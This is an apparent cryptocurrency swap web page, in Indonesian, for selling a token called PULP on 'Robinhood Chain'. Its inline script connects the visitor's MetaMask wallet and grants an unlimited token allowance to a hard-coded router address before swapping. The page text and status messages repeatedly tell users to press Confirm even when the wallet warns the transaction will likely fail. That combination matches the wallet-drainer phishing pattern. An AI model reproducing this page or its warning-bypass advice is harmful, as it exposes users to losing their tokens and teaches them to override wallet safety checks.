<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Swap PULP</title>
<style>body{margin:0;background:#07080b;color:#fff;font-family:-apple-system,sans-serif}main{max-width:420px;margin:0 auto;padding:28px 16px}button{border:0;border-radius:12px;padding:14px;font-weight:700;width:100%;background:#ff37c7;color:#1a0b14;font-size:16px}.card{background:#14161c;border-radius:16px;padding:14px}input{width:100%;background:transparent;border:0;color:#fff;font-size:28px;outline:none}#log{margin-top:12px;background:#101218;border-radius:12px;padding:12px;min-height:72px;white-space:pre-wrap}</style></head>
<body><main><h1>Jual PULP</h1><p>Approve tiap swap, lalu jual. Harga dari router.</p><div class="card"><input id="amount" value="83365"><p id="bal">Saldo: -</p></div><p id="quote">Harga: mengambil...</p><button id="go" type="button">Connect lalu jual</button><div id="log">Kalau wallet bilang likely to fail, tetap Confirm. Simulasi router lolos.</div></main>
<script>
const TOKEN="0x170867335fc4eeff6c2b4d07de6fc8b4f57048d0",ROUTER="0x89e5DB8B5aA49aA85AC63f691524311AEB649eba",WETH="0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73",RPC="https://rpc.mainnet.chain.robinhood.com",CHAIN="0x1237",MAX="ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
let account=null,quoted=0n;
const log=m=>document.getElementById("log").textContent=String(m);
const pad=h=>h.toLowerCase().replace(/^0x/,"").padStart(64,"0");
const word=n=>BigInt(n).toString(16).padStart(64,"0");
function parseAmount(t){const [a,b=""]=String(t).trim().split(".");return BigInt(a||"0")*10n**18n+BigInt((b+"000000000000000000").slice(0,18))}
function fmt(n){const v=Number(n)/1e18;return Number.isFinite(v)?(v<1?v.toFixed(6):v.toFixed(2)):"-"}
async function rpc(method,params){const r=await fetch(RPC,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({jsonrpc:"2.0",id:1,method,params})});const d=await r.json();if(d.error)throw new Error(d.error.message||JSON.stringify(d.error));return d.result}
async function liveQuote(amount){const data="0xd06ca61f"+word(amount)+word(64)+word(2)+pad(TOKEN)+pad(WETH);const out=await rpc("eth_call",[{to:ROUTER,data},"latest"]);const body=out.slice(2);let last=0n;for(let i=0;i<body.length;i+=64)last=BigInt("0x"+body.slice(i,i+64));return last}
async function quote(){try{quoted=await liveQuote(parseAmount(document.getElementById("amount").value));document.getElementById("quote").textContent="Harga live "+fmt(quoted)+" ETH, min "+fmt(quoted*90n/100n)+" ETH"}catch(e){document.getElementById("quote").textContent="Harga gagal"}}
async function send(tx){return window.ethereum.request({method:"eth_sendTransaction",params:[tx]})}
async function wait(hash){for(let i=0;i<45;i++){const rec=await rpc("eth_getTransactionReceipt",[hash]);if(rec){if(rec.status==="0x0")throw new Error("gagal "+hash);return}await new Promise(r=>setTimeout(r,1500))}throw new Error("pending "+hash)}
document.getElementById("amount").oninput=quote;
document.getElementById("go").onclick=async()=>{try{if(!window.ethereum){log("Buka di browser MetaMask");return}try{await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:CHAIN}]})}catch(e){if(e.code===4902)await window.ethereum.request({method:"wallet_addEthereumChain",params:[{chainId:CHAIN,chainName:"Robinhood Chain",nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},rpcUrls:[RPC],blockExplorerUrls:["https://robinhoodchain.blockscout.com"]}]});else throw e}if(!account)account=(await window.ethereum.request({method:"eth_requestAccounts"}))[0];const amount=parseAmount(document.getElementById("amount").value);const bal=BigInt(await rpc("eth_call",[{to:TOKEN,data:"0x70a08231"+pad(account)},"latest"]));document.getElementById("bal").textContent="Saldo PULP: "+fmt(bal);const out=quoted||await liveQuote(amount);const min=out*90n/100n;const deadline=BigInt(Math.floor(Date.now()/1000)+1800);const swap="0x791ac947"+word(amount)+word(min)+word(160)+pad(account)+word(deadline)+word(2)+pad(TOKEN)+pad(WETH);await rpc("eth_call",[{from:account,to:ROUTER,data:swap},"latest"]);log("Simulasi lolos. Approve dulu, Confirm meski ada warning.");await wait(await send({from:account,to:TOKEN,data:"0x095ea7b3"+pad(ROUTER)+MAX,value:"0x0",gas:"0x10000"}));log("Approval masuk. Sekarang Confirm swap.");await wait(await send({from:account,to:ROUTER,data:swap,value:"0x0",gas:"0x30000"}));log("Jual sukses. Cek ETH.");await quote()}catch(e){log(e.message||e)}};
quote();
</script></body></html>
